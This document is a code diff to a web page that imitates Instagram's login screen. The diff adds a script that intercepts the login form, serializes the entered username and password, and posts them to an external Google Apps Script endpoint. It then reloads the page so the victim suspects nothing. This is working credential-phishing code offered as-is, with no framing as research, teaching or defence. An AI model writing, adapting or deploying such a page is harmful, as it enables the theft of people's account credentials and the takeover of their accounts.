@@ -7,6 +7,7 @@
     <title>Log in • Instagram</title>
     <link rel="stylesheet" href="style.css">
     <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     
 </head>
 <body>
@@ -19,7 +20,7 @@
             
                 <!--Inputs starts here-->
             <div class="form">
-                <form action="">
+                <form id="submit-form" action="">
                     <input type="text" id="uname" name="uname" placeholder="Phone number, username or email address"><br>
                     <input type="password" id="pass" name="pass" placeholder="Password"><br>
                     <input class="submit" type="submit" value="Log In">
@@ -56,7 +57,8 @@
         </div>
 
     <div class="secB">
-        <p1 class="b2">Meta&emsp;
+        <p1 class="b2">
+            Meta&emsp;
             About&emsp;
             Blog&emsp;
             Jobs&emsp;
@@ -71,8 +73,27 @@
             Contact uploading and non-users</p1>
 
 
-        <p class="b1">English (UK)&emsp;© 2022 Instagram from Meta</p>
+        <p class="b1">English (UK) &emsp;© 2022 Instagram from Meta</p>
     </div>
     </div>
+    <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbwDWfhorFQLx94ba4WpCk97n0dB_gNDnrQ45z7Likj6jqThuZZ20RmYBWbVFw4qcAtP/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    //alert("Form submitted successfully")
+                    window.location.reload()
+                    //window.location.href="https://google.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
 </body>
 </html>
